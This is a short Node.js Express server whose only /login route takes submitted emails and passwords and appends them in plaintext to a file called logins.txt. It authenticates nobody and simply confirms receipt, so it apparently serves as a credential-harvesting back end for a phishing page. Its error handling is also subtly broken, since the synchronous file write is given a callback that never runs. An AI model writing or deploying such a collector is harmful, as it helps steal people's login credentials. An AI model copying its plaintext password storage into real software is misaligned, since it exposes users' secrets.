const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.json());

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const data = `Email: ${email}, Password: ${password}\n`;
  
  fs.appendFileSync('logins.txt', data, (err) => {
    if (err) throw err;
  });

  res.status(200).send('Login information received!');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
